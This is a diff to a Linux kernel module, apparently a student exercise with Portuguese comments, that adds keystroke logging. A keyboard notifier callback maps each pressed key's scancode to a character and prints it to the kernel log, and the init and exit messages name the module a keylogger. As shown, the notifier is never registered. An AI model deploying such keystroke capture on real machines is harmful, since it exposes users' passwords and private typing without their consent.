@@ -8,13 +8,11 @@
 #include <linux/debugfs.h>
 #include <linux/input.h>
 
+#define final_key 126
+
 MODULE_LICENSE("Dual BSD/GPL");
 MODULE_AUTHOR("Luis Otavio O.C, Pedro P.");
  
-//  receber parametros
-// static char arquivo[BUF_LEN];
-// module_param_string(arquivo, arq, BUF_LEN, 0);
-
 
 // mapeando as teclas do teclado de acordo com scancode
 static const char *teclado[][2] = {
@@ -147,20 +145,43 @@ static const char *teclado[][2] = {
 	{".", "."}              
 };
 
+// converter o código da tecla para uma string
+void converte_code(int keycode, int shift_mask)
+{
+	if (keycode > KEY_RESERVED && keycode <= final_key) {
+		const char *tecla = teclado[keycode][shift_mask]; //pegando a tecla na posição da matriz, se está com shift ativado ou não
+		printk(KERN_INFO "%s\n", tecla); //escrevendo a tecla digitada
+	}
+}
 
-const struct file_operations keys_fops = {
-	.read = keys_read,
+// função para chamar o tradutor de tecla
+int callback(struct notifier_block *nblock, unsigned long code, void *_param)
+{
+	struct keyboard_notifier_param *param = _param;
+
+	// executar somente quando uma tecla for pressionada e o código vier como inteiro
+	if (param->down && code == KBD_KEYCODE){
+		converte_code(param->value, param->shift);
+	}
+	
+	return NOTIFY_OK;
+}
+
+//definindo função a ser chamada quando houver uma notificação
+static struct notifier_block notificador =
+{
+    .notifier_call = callback
 };
 
 static int __init simple_init(void)
 {
-	printk(KERN_ALERT "hello...\n");
+	printk(KERN_ALERT "Inicializando o keylogger\n");
 	return 0;
 }
  
 static void __exit simple_cleanup(void)
 {
-	printk(KERN_WARNING "bye ...\n");
+	printk(KERN_WARNING "Finalizando o keylogger\n");
 }
  
 module_init(simple_init);
